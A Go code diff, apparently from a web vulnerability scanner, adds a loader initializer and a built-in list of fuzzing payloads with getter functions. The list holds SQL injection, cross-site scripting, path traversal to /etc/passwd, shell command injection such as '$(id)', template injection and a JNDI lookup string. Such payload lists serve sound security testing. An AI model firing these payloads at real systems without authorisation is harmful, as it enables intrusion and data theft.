@@ -18,6 +18,15 @@ func InitLoader(enableSecLists, enableKiterunner bool) {
 	})
 }
 
+// InitLoaderWithConfig initializes the global loader with an explicit
+// configuration (profile, vendored SecLists directory, etc.). The first call
+// wins; subsequent calls are ignored, matching InitLoader semantics.
+func InitLoaderWithConfig(cfg LoaderConfig) {
+	loaderOnce.Do(func() {
+		globalLoader = NewExternalLoaderWithConfig(cfg)
+	})
+}
+
 var CommonDirectories = []string{
 	"/",
 	"/admin",
@@ -152,6 +161,37 @@ var CommonAPIEndpoints = []string{
 	"/.well-known/openid-configuration",
 }
 
+// CommonFuzzPayloads is a small built-in set of active-fuzzing injection
+// payloads used to seed probes when external SecLists/PayloadsAllTheThings
+// loading is disabled or unavailable.
+var CommonFuzzPayloads = []string{
+	"'",
+	"\"",
+	"`",
+	"' OR '1'='1",
+	"\" OR \"1\"=\"1",
+	"' OR 1=1-- -",
+	"1' AND SLEEP(5)-- -",
+	"<script>alert(1)</script>",
+	"\"><script>alert(1)</script>",
+	"<img src=x onerror=alert(1)>",
+	"javascript:alert(1)",
+	"../../../../etc/passwd",
+	"..%2f..%2f..%2fetc%2fpasswd",
+	"....//....//....//etc/passwd",
+	"; id",
+	"| id",
+	"$(id)",
+	"`id`",
+	"${7*7}",
+	"{{7*7}}",
+	"<%= 7*7 %>",
+	"#{7*7}",
+	"${jndi:ldap://example.com/a}",
+	"%00",
+	"%0d%0a",
+}
+
 func GetCommonDirectories() []string {
 	return append([]string{}, CommonDirectories...)
 }
@@ -183,6 +223,21 @@ func GetCommonAPIEndpointsWithExternal(ctx context.Context) []string {
 		return GetCommonAPIEndpoints()
 	}
 	return globalLoader.LoadAPIEndpoints(ctx)
+}
+
+// GetCommonFuzzPayloads returns the built-in active-fuzzing payload set.
+func GetCommonFuzzPayloads() []string {
+	return append([]string{}, CommonFuzzPayloads...)
+}
+
+// GetFuzzingPayloadsWithExternal returns active-fuzzing injection payloads,
+// augmented with SecLists Fuzzing/ and PayloadsAllTheThings payloads when the
+// external loader is initialized and enabled.
+func GetFuzzingPayloadsWithExternal(ctx context.Context) []string {
+	if globalLoader == nil {
+		return GetCommonFuzzPayloads()
+	}
+	return globalLoader.LoadFuzzingPayloads(ctx)
 }
 
 var frameworkDirectoryPriorities = map[string][]string{
